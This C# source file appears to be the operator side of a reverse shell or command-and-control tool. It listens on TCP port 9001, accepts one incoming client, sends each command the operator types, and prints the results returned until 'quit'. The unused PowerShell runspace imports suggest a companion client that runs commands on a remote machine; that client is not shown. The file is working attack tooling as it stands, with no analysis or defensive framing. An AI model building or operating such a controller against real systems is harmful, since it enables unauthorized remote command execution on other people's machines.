using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using System.Net.Configuration;
using System.Net.Sockets;
using System.Management.Automation;
using System.Management.Automation.Runspaces;

namespace Server
{
    internal class Program
    {
        static void Main(string[] args)
        {
            IPEndPoint ipe = new IPEndPoint(IPAddress.Any, 9001);

            Socket server_sock = new Socket(IPAddress.Any.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
            server_sock.Bind(ipe);
            server_sock.Listen(6);
            Socket client_soc = server_sock.Accept();

            Console.WriteLine("[+] Connection Received From: {0}", client_soc.RemoteEndPoint);
            Console.Write("[>] Enter Command: ");
            
            string msg;
            msg = Console.ReadLine();
            client_soc.Send(Encoding.ASCII.GetBytes(msg));

            while (msg != "quit")
            {
                byte[] buff = new byte[2048];
                Array.Clear(buff, 0, buff.Length);
                client_soc.Receive(buff);
                Console.WriteLine(Encoding.ASCII.GetString(buff).TrimEnd('\0'));
                Console.Write("[>] Enter Command: ");
                msg = Console.ReadLine();
                client_soc.Send(Encoding.ASCII.GetBytes(msg));
            }

            client_soc.Close();
            server_sock.Close();
        }
    }
}
